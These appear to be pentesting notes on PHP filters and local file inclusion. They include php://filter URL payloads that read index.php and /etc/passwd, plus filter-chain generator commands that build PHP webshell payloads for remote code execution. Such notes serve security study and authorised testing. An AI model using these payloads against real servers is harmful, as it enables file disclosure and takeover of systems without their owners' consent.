# PHP Filters

PHP Filters are a powerful wrappers of lots a functionality that take input and perform operations on it without developer having to write in-house checks, filters, etc against common input to website.
- [Validation Filters perform type and pattern checks](https://www.php.net/manual/en/filter.filters.validate.php)
- [Sanitization Filters perform string operations to modify unsafe input](https://www.php.net/manual/en/filter.filters.sanitize.php)
- [Only other is "callback" where all flags are ignored](https://www.php.net/manual/en/filter.filters.misc.php)
- [PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) provides developers to filter by builtin conditions-on-passed-input, encode the input.

File inclusion vulnerability exists due to how PHP filters are used with `include()`

[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
```php
// only php://filter is case insensitive
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
// They can be chained together with:
// | or /
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
// base64encode only for limit exfil - buffer size 8192 bytes
```
- [PHP Documentation base64encode](https://www.php.net/manual/en/function.base64-encode.php)
- [Filter Chains can used to chain encodings till a desired payload - yikes](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
	- Generate PHP filter chains with [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
	- Junk characters do end up appended to the end
- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py)
- Consider [Hacktricks improvements on a Alles CTF script to get LFI2RCE via PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
```
No `system` no problem
```bash
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
```

## References

[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
[PHP Documentation base64encode](https://www.php.net/manual/en/function.base64-encode.php)
[Filter Chains Usage by Synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
[LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py)
[Hacktricks improvements on a Alles CTF script to get LFI2RCE via PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
[Validation Filters](https://www.php.net/manual/en/filter.filters.validate.php)
[Sanitization Filters](https://www.php.net/manual/en/filter.filters.sanitize.php)
[Misc Filters](https://www.php.net/manual/en/filter.filters.misc.php)
[PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) 

